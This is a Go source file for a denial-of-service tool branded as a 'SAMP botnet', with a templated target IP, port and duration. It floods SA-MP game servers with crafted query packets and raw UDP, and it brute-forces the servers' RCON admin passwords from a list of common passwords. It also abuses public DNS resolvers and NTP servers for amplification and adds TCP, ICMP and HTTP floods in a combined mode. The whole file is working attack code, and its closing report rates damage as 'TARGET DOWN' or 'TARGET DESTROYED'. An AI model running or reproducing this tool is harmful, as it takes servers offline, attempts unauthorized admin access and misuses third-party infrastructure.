package main

import (
    "fmt"
    "net"
    "time"
    "runtime"
    "sync/atomic"
    "math/rand"
    "syscall"
    "encoding/binary"
    "strings"
    "sync"
    "os"
    "os/signal"
)

// Global counters
var (
    totalPackets uint64 = 0
    totalBytes   uint64 = 0
    peakPPS      uint64 = 0
    peakGBPS     uint64 = 0
    stopFlag     int32  = 0
)

// Pre-allocated packet pools
var (
    sampPackets   [][]byte
    udpPackets    [][]byte
    rconPackets   [][]byte
    rulesPackets  [][]byte
    playerPackets [][]byte
    dnsQueries    [][]byte
    ntpRequests   [][]byte
)

func main() {
    targetIP := "{{.TargetIP}}"
    targetPort := {{.TargetPort}}
    duration := {{.Duration}}
    threadMultiplier := {{.Threads}}
    method := "{{.Method}}"
    
    runtime.GOMAXPROCS(runtime.NumCPU())
    
    targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
    if err != nil {
        fmt.Printf("Error: %v\n", err)
        return
    }
    
    // Banner
    fmt.Printf("\n")
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                         🔥 SAMP BOTNET ULTIMATE EDITION v3.1 - MAX POWER 🔥                                                ║\n")
    fmt.Printf("║                         50,000 VARIANTS - AGGRESSIVE MODE - NO ADAPTIVE DELAY                                              ║\n")
    fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\n")
    fmt.Printf("║  [ TARGET ] %-30s | [ PORT ] %-10d | [ DURATION ] %-10d                           ║\n", targetIP, targetPort, duration)
    fmt.Printf("║  [ CPU ] %-10d cores | [ THREADS ] %-10d | [ METHOD ] %-10s                              ║\n", 
        runtime.NumCPU(), threadMultiplier*runtime.NumCPU(), method)
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
    fmt.Printf("\n")
    
    stopTime := time.Now().Add(time.Duration(duration) * time.Second)
    
    // MAX POWER: Gunakan thread count agresif seperti v1
    cpuCores := runtime.NumCPU()
    baseThreads := cpuCores * 1500 // 1500 threads per core (sama seperti v1)
    
    // Safety cap
    maxThreads := 8000
    if baseThreads > maxThreads {
        baseThreads = maxThreads
    }
    
    threadsPerCore := baseThreads / cpuCores
    fmt.Printf("[✓] CPU: %d cores, Threads: %d, Threads/Core: %d\n", cpuCores, baseThreads, threadsPerCore)
    
    // Socket buffer besar (seperti v1)
    setSocketBuffer := func(conn *net.UDPConn) {
        file, err := conn.File()
        if err == nil {
            fd := int(file.Fd())
            syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 8*1024*1024)
            file.Close()
        }
    }
    
    // ==================== GENERATE PACKETS (50,000 VARIANTS) ====================
    fmt.Printf("\n[1/5] Generating 50,000 SAMP packet variants... ")
    
    packetCount := 50000 // Maksimal varian
    
    sampPackets = make([][]byte, packetCount)
    
    // Headers - 32 variants
    headerVariants := make([][]byte, 32)
    for i := 0; i < 32; i++ {
        h := make([]byte, 8)
        for j := 0; j < 4; j++ {
            h[j] = byte(rand.Intn(256))
        }
        copy(h[4:], []byte{'S', 'A', 'M', 'P'})
        headerVariants[i] = h
    }
    
    queryTypes := make([]byte, 23)
    for i := 0; i < 23; i++ {
        queryTypes[i] = 0x69 + byte(i)
    }
    
    // Generate 50,000 variants with 16 patterns
    for i := 0; i < packetCount; i++ {
        size := 64 + rand.Intn(1984)
        packet := make([]byte, size)
        
        header := headerVariants[rand.Intn(len(headerVariants))]
        copy(packet[0:8], header)
        
        if len(packet) > 14 {
            packet[14] = queryTypes[rand.Intn(len(queryTypes))]
        }
        
        pattern := rand.Intn(16)
        switch pattern {
        case 0:
            for j := 15; j < size; j++ {
                packet[j] = byte(rand.Intn(256))
            }
        case 1:
            for j := 15; j < size; j++ {
                packet[j] = byte((j - 15) % 256)
            }
        case 2:
            val := byte(rand.Intn(256))
            for j := 15; j < size; j++ {
                packet[j] = val
            }
        case 3:
            base := byte(rand.Intn(200))
            for j := 15; j < size; j++ {
                packet[j] = base + byte((j-15)%50)
            }
        case 4:
            // Zero fill
        case 5:
            for j := 15; j < size; j++ {
                packet[j] = 0xFF
            }
        case 6:
            for j := 15; j < size; j++ {
                packet[j] = byte(0xAA + (j%2)*0x55)
            }
        case 7:
            for j := 15; j < size; j++ {
                packet[j] = byte(255 - ((j - 15) % 256))
            }
        case 8:
            for j := 15; j < size-1; j += 2 {
                binary.LittleEndian.PutUint16(packet[j:j+2], uint16(rand.Intn(65535)))
            }
        case 9:
            for j := 15; j < size-3; j += 4 {
                binary.LittleEndian.PutUint32(packet[j:j+4], rand.Uint32())
            }
        case 10:
            for j := 15; j < size-7; j += 8 {
                binary.LittleEndian.PutUint64(packet[j:j+8], rand.Uint64())
            }
        case 11:
            for j := 15; j < size; j++ {
                packet[j] = byte(rand.Intn(2)) * 0xFF
            }
        case 12:
            for j := 15; j < size; j++ {
                packet[j] = byte((j * 131071) % 256)
            }
        case 13:
            a, b := byte(1), byte(1)
            for j := 15; j < size; j++ {
                packet[j] = a
                a, b = b, a+b
            }
        case 14:
            key := byte(rand.Intn(256))
            for j := 15; j < size; j++ {
                packet[j] = byte(j) ^ key
            }
        case 15:
            for j := 15; j < size; j++ {
                if j%2 == 0 {
                    packet[j] = byte(rand.Intn(256))
                } else {
                    packet[j] = byte((j - 15) % 256)
                }
            }
        }
        sampPackets[i] = packet
    }
    fmt.Printf("OK (50,000 variants)\n")
    
    // ==================== RCON BRUTE (10,000 VARIANTS) ====================
    fmt.Printf("[2/5] Generating RCON brute packets (10,000 variants)... ")
    
    rconPackets = make([][]byte, 10000)
    rconCmds := []string{
        "rcon", "password", "login", "auth", "admin", "root", "changeme", "123456",
        "qwerty", "letmein", "admin123", "password123", "12345", "123456789",
        "adminadmin", "server", "samp", "gtasa", "gta", "sanandreas",
        "gaming", "host", "owner", "moderator", "superuser", "master",
        "test", "testing", "default", "sample", "demo", "example",
        "welcome", "secret", "god", "dragon", "master", "shadow",
    }
    
    for i := 0; i < 10000; i++ {
        size := 32 + rand.Intn(128)
        packet := make([]byte, size)
        copy(packet[0:8], []byte{0xFF, 0xFF, 0xFF, 0xFF, 'S', 'A', 'M', 'P'})
        packet[14] = 0x72
        cmd := rconCmds[rand.Intn(len(rconCmds))] + fmt.Sprintf("%d", rand.Intn(999999))
        copy(packet[15:], cmd)
        rconPackets[i] = packet
    }
    fmt.Printf("OK\n")
    
    // ==================== UDP FLOOD (20,000 VARIANTS) ====================
    fmt.Printf("[3/5] Generating UDP flood packets (20,000 variants)... ")
    
    udpPackets = make([][]byte, 20000)
    for i := 0; i < 20000; i++ {
        size := 64 + rand.Intn(1984)
        packet := make([]byte, size)
        for j := 0; j < size; j += 8 {
            if j+7 < size {
                binary.LittleEndian.PutUint64(packet[j:j+8], rand.Uint64())
            }
        }
        udpPackets[i] = packet
    }
    fmt.Printf("OK\n")
    
    // ==================== RULES/PLAYER QUERIES ====================
    fmt.Printf("[4/5] Generating rules/player queries (5,000 variants)... ")
    
    rulesPackets = make([][]byte, 5000)
    playerPackets = make([][]byte, 5000)
    
    for i := 0; i < 5000; i++ {
        size := 32 + rand.Intn(96)
        packet := make([]byte, size)
        copy(packet[0:8], headerVariants[rand.Intn(len(headerVariants))])
        packet[14] = 0x71
        for j := 15; j < size; j++ {
            packet[j] = byte(rand.Intn(26) + 97)
        }
        rulesPackets[i] = packet
        
        size2 := 24 + rand.Intn(40)
        packet2 := make([]byte, size2)
        copy(packet2[0:8], headerVariants[rand.Intn(len(headerVariants))])
        packet2[14] = 0x70
        playerPackets[i] = packet2
    }
    fmt.Printf("OK\n")
    
    // ==================== AMPLIFICATION VECTORS ====================
    fmt.Printf("[5/5] Generating amplification vectors (5,000 queries)... ")
    
    dnsServers := []string{
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
        "208.67.222.222", "208.67.220.220", "94.140.14.14", "94.140.15.15",
    }
    
    ntpServers := []string{
        "pool.ntp.org", "time.google.com", "time.windows.com",
        "time.apple.com", "time.cloudflare.com",
    }
    
    dnsQueries = make([][]byte, 5000)
    domains := []string{
        "google.com", "amazon.com", "facebook.com", "microsoft.com",
        "cloudflare.com", "github.com", "youtube.com", "twitter.com",
        "instagram.com", "linkedin.com", "netflix.com", "spotify.com",
        "discord.com", "telegram.org", "whatsapp.com", "tiktok.com",
    }
    
    for i := 0; i < 5000; i++ {
        query := make([]byte, 512)
        binary.BigEndian.PutUint16(query[0:2], uint16(rand.Intn(65535)))
        binary.BigEndian.PutUint16(query[2:4], 0x0100)
        binary.BigEndian.PutUint16(query[4:6], 1)
        
        pos := 12
        domain := domains[rand.Intn(len(domains))]
        if rand.Intn(2) == 0 {
            domain = "www." + domain
        }
        parts := strings.Split(domain, ".")
        for _, part := range parts {
            query[pos] = byte(len(part))
            pos++
            copy(query[pos:], []byte(part))
            pos += len(part)
        }
        query[pos] = 0
        pos++
        
        binary.BigEndian.PutUint16(query[pos:pos+2], 255)
        pos += 2
        binary.BigEndian.PutUint16(query[pos:pos+2], 1)
        
        dnsQueries[i] = query[:pos+2]
    }
    
    ntpRequests = make([][]byte, 2)
    ntpRequests[0] = []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
    ntpRequests[1] = []byte{0x1b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
    fmt.Printf("OK\n\n")
    
    // ==================== ATTACK EXECUTION ====================
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                                   MAX POWER ATTACK VECTORS                                       ║\n")
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
    
    type connection struct {
        conn *net.UDPConn
        addr *net.UDPAddr
    }
    
    udpPool := sync.Pool{
        New: func() interface{} {
            conn, _ := net.DialUDP("udp", nil, targetAddr)
            setSocketBuffer(conn)
            return &connection{conn: conn, addr: targetAddr}
        },
    }
    
    // Signal handler
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, os.Interrupt)
    go func() {
        <-sigChan
        atomic.StoreInt32(&stopFlag, 1)
        fmt.Printf("\n[!] Interrupted, stopping...\n")
    }()
    
    startTime := time.Now()
    
    switch method {
    case "UDP":
        fmt.Printf("[VECTOR] MAX UDP: %d threads\n", baseThreads)
        for i := 0; i < baseThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    burstSize := 3 + rand.Intn(5) // 3-7 packets (seperti v1)
                    for b := 0; b < burstSize; b++ {
                        packet := udpPackets[rand.Intn(20000)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    }
                    time.Sleep(time.Microsecond) // Delay 1µs (seperti v1)
                }
            }()
            time.Sleep(time.Millisecond)
        }
        
    case "SAMP":
        fmt.Printf("[VECTOR] MAX SAMP: %d threads (50,000 variants)\n", baseThreads)
        
        normalThreads := baseThreads * 40 / 100
        rconThreads := baseThreads * 30 / 100
        rulesThreads := baseThreads * 15 / 100
        playerThreads := baseThreads * 15 / 100
        
        fmt.Printf("  ├─ Normal Queries: %d threads (50,000 variants)\n", normalThreads)
        fmt.Printf("  ├─ RCON Brute: %d threads (10,000 variants)\n", rconThreads)
        fmt.Printf("  ├─ Rules Query: %d threads (5,000 variants)\n", rulesThreads)
        fmt.Printf("  └─ Player Query: %d threads (5,000 variants)\n", playerThreads)
        
        for i := 0; i < normalThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := sampPackets[rand.Intn(50000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    
                    if rand.Intn(3) == 0 {
                        pkt := sampPackets[rand.Intn(50000)]
                        conn.conn.Write(pkt)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        for i := 0; i < rconThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := rconPackets[rand.Intn(10000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    
                    for j := 0; j < 2; j++ {
                        pkt := rconPackets[rand.Intn(10000)]
                        conn.conn.Write(pkt)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond * 2)
                }
            }()
        }
        
        for i := 0; i < rulesThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := rulesPackets[rand.Intn(5000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        for i := 0; i < playerThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := playerPackets[rand.Intn(5000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
    case "MIX":
        fmt.Printf("[VECTOR] MAX MIX (SAMP 70%% + UDP 30%%): %d threads\n", baseThreads)
        
        sampThreads := baseThreads * 70 / 100
        udpThreads := baseThreads - sampThreads
        
        for i := 0; i < sampThreads; i++ {
            go func(id int) {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    switch id % 4 {
                    case 0:
                        packet := sampPackets[rand.Intn(50000)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    case 1:
                        packet := rconPackets[rand.Intn(10000)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    case 2:
                        packet := rulesPackets[rand.Intn(5000)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    case 3:
                        packet := playerPackets[rand.Intn(5000)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    }
                    time.Sleep(time.Microsecond)
                }
            }(i)
        }
        
        for i := 0; i < udpThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := udpPackets[rand.Intn(20000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
    case "AMPLIFY":
        fmt.Printf("[VECTOR] MAX AMPLIFY: %d threads\n", baseThreads)
        
        dnsThreads := baseThreads * 70 / 100
        ntpThreads := baseThreads - dnsThreads
        
        for i := 0; i < dnsThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    for s := 0; s < 3; s++ {
                        server := dnsServers[rand.Intn(len(dnsServers))]
                        serverAddr, _ := net.ResolveUDPAddr("udp", server+":53")
                        query := dnsQueries[rand.Intn(5000)]
                        conn.WriteToUDP(query, serverAddr)
                        atomic.AddUint64(&totalPackets, 30)
                        atomic.AddUint64(&totalBytes, 30*512)
                    }
                    time.Sleep(time.Microsecond * 10)
                }
            }()
        }
        
        for i := 0; i < ntpThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    server := ntpServers[rand.Intn(len(ntpServers))]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":123")
                    req := ntpRequests[rand.Intn(2)]
                    conn.WriteToUDP(req, serverAddr)
                    if req[0] == 0x17 {
                        atomic.AddUint64(&totalPackets, 100)
                        atomic.AddUint64(&totalBytes, 100*512)
                    } else {
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, 48)
                    }
                    time.Sleep(time.Microsecond * 20)
                }
            }()
        }
        
    case "GOD":
        fmt.Printf("[VECTOR] MAX GOD MODE - ALL METHODS COMBINED\n")
        
        sampNormalThreads := baseThreads * 22 / 100
        sampRCONThreads := baseThreads * 18 / 100
        sampRulesThreads := baseThreads * 15 / 100
        sampPlayerThreads := baseThreads * 10 / 100
        udpThreads := baseThreads * 15 / 100
        dnsThreads := baseThreads * 8 / 100
        ntpThreads := baseThreads * 4 / 100
        tcpThreads := baseThreads * 3 / 100
        icmpThreads := baseThreads * 3 / 100
        httpThreads := baseThreads * 2 / 100
        
        fmt.Printf("  ├─ SAMP Normal: %d threads (50,000 variants)\n", sampNormalThreads)
        fmt.Printf("  ├─ SAMP RCON: %d threads (10,000 variants)\n", sampRCONThreads)
        fmt.Printf("  ├─ SAMP Rules: %d threads (5,000 variants)\n", sampRulesThreads)
        fmt.Printf("  ├─ SAMP Player: %d threads (5,000 variants)\n", sampPlayerThreads)
        fmt.Printf("  ├─ UDP: %d threads (20,000 variants)\n", udpThreads)
        fmt.Printf("  ├─ DNS Amplify: %d threads\n", dnsThreads)
        fmt.Printf("  ├─ NTP Amplify: %d threads\n", ntpThreads)
        fmt.Printf("  ├─ TCP: %d threads\n", tcpThreads)
        fmt.Printf("  ├─ ICMP: %d threads\n", icmpThreads)
        fmt.Printf("  └─ HTTP: %d threads\n", httpThreads)
        
        // SAMP Normal
        for i := 0; i < sampNormalThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := sampPackets[rand.Intn(50000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // SAMP RCON
        for i := 0; i < sampRCONThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := rconPackets[rand.Intn(10000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // SAMP Rules
        for i := 0; i < sampRulesThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := rulesPackets[rand.Intn(5000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // SAMP Player
        for i := 0; i < sampPlayerThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := playerPackets[rand.Intn(5000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // UDP
        for i := 0; i < udpThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    packet := udpPackets[rand.Intn(20000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // DNS Amplification
        for i := 0; i < dnsThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    server := dnsServers[rand.Intn(len(dnsServers))]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":53")
                    query := dnsQueries[rand.Intn(5000)]
                    conn.WriteToUDP(query, serverAddr)
                    atomic.AddUint64(&totalPackets, 25)
                    atomic.AddUint64(&totalBytes, 25*512)
                    time.Sleep(time.Microsecond * 5)
                }
            }()
        }
        
        // NTP Amplification
        for i := 0; i < ntpThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    server := ntpServers[rand.Intn(len(ntpServers))]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":123")
                    req := ntpRequests[rand.Intn(2)]
                    conn.WriteToUDP(req, serverAddr)
                    if req[0] == 0x17 {
                        atomic.AddUint64(&totalPackets, 50)
                        atomic.AddUint64(&totalBytes, 50*512)
                    } else {
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, 48)
                    }
                    time.Sleep(time.Microsecond * 10)
                }
            }()
        }
        
        // TCP SYN
        for i := 0; i < tcpThreads; i++ {
            go func() {
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), time.Second)
                    if err == nil {
                        conn.Close()
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, 64)
                    }
                    time.Sleep(time.Millisecond)
                }
            }()
        }
        
        // ICMP
        for i := 0; i < icmpThreads; i++ {
            go func() {
                conn, err := net.DialIP("ip4:icmp", nil, &net.IPAddr{IP: net.ParseIP(targetIP)})
                if err != nil {
                    return
                }
                defer conn.Close()
                
                icmpPacket := make([]byte, 64)
                icmpPacket[0] = 8
                icmpPacket[1] = 0
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    binary.BigEndian.PutUint16(icmpPacket[2:4], uint16(rand.Intn(65535)))
                    conn.Write(icmpPacket)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, 64)
                    time.Sleep(time.Millisecond)
                }
            }()
        }
        
        // HTTP
        httpPaths := []string{"/", "/index.html", "/api", "/login", "/wp-admin"}
        userAgents := []string{
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        }
        
        for i := 0; i < httpThreads; i++ {
            go func() {
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, 80), time.Second)
                    if err == nil {
                        req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n",
                            httpPaths[rand.Intn(len(httpPaths))], targetIP, userAgents[rand.Intn(len(userAgents))])
                        conn.Write([]byte(req))
                        conn.Close()
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(req)))
                    }
                    time.Sleep(time.Millisecond)
                }
            }()
        }
    }
    
    // ==================== MONITORING ====================
    fmt.Printf("\n[%s] Attack started (max power)...\n", method)
    var lastPackets uint64 = 0
    var lastBytes uint64 = 0
    var peakPackets uint64 = 0
    var peakBandwidth uint64 = 0
    
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()
    
    for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
        <-ticker.C
        currentPackets := atomic.LoadUint64(&totalPackets)
        currentBytes := atomic.LoadUint64(&totalBytes)
        elapsed := time.Since(startTime).Seconds()
        
        pps := float64(currentPackets-lastPackets) / 2.0
        mbps := float64(currentBytes-lastBytes) * 8.0 / (2.0 * 1024 * 1024)
        gbps := mbps / 1000
        
        if uint64(pps) > peakPackets {
            peakPackets = uint64(pps)
        }
        if uint64(gbps*1000) > peakBandwidth {
            peakBandwidth = uint64(gbps * 1000)
        }
        
        fmt.Printf("\r[%.0fs] PPS: %.0f | MBPS: %.1f | GBPS: %.2f | TOTAL: %s packets", 
            elapsed, pps, mbps, gbps, formatNumber(int64(currentPackets)))
        
        lastPackets = currentPackets
        lastBytes = currentBytes
    }
    fmt.Println()
    
    // ==================== FINAL STATS ====================
    total := atomic.LoadUint64(&totalPackets)
    totalBytesVal := atomic.LoadUint64(&totalBytes)
    totalMB := float64(totalBytesVal) / (1024 * 1024)
    totalGB := totalMB / 1024
    avgPPS := total / uint64(duration)
    avgMBPS := (totalMB * 8) / float64(duration)
    avgGBPS := avgMBPS / 1000
    
    fmt.Printf("\n")
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                                   FINAL ATTACK STATISTICS                                        ║\n")
    fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════════════════════════╣\n")
    fmt.Printf("║                                                                                                  ║\n")
    fmt.Printf("║  📦 TOTAL PACKETS:      %-30s                    ║\n", formatNumber(int64(total)))
    fmt.Printf("║  📊 TOTAL DATA:         %.2f MB (%.2f GB)                                   ║\n", totalMB, totalGB)
    fmt.Printf("║  ⚡ AVERAGE PPS:         %-30s                    ║\n", formatNumber(int64(avgPPS)))
    fmt.Printf("║  🌐 AVERAGE MBPS:        %.1f MBps                                          ║\n", avgMBPS)
    fmt.Printf("║  💀 AVERAGE GBPS:        %.2f Gbps                                           ║\n", avgGBPS)
    fmt.Printf("║  🔥 PEAK PPS:            %-30s                    ║\n", formatNumber(int64(peakPackets)))
    fmt.Printf("║  ⚡ PEAK GBPS:           %.2f Gbps                                           ║\n", float64(peakBandwidth)/1000)
    fmt.Printf("║                                                                                                  ║\n")
    
    impact := ""
    if avgGBPS > 100 {
        impact = "💀💀💀 APOCALYPSE - NETWORK COLLAPSE 💀💀💀"
    } else if avgGBPS > 50 {
        impact = "💀💀 TARGET DESTROYED 💀💀"
    } else if avgGBPS > 20 {
        impact = "💀 TARGET DOWN 💀"
    } else if avgGBPS > 10 {
        impact = "⚠️ TARGET CRASHED ⚠️"
    } else if avgGBPS > 5 {
        impact = "⚠️ TARGET LAGGING ⚠️"
    } else if avgGBPS > 1 {
        impact = "ℹ️ LIGHT DAMAGE ℹ️"
    } else {
        impact = "✅ NO DAMAGE ✅"
    }
    
    fmt.Printf("║  %-80s ║\n", impact)
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
}

func formatNumber(n int64) string {
    if n < 1000 {
        return fmt.Sprintf("%d", n)
    }
    if n < 1000000 {
        return fmt.Sprintf("%.1fK", float64(n)/1000)
    }
    if n < 1000000000 {
        return fmt.Sprintf("%.1fM", float64(n)/1000000)
    }
    if n < 1000000000000 {
        return fmt.Sprintf("%.1fB", float64(n)/1000000000)
    }
    return fmt.Sprintf("%.1fT", float64(n)/1000000000000)
}
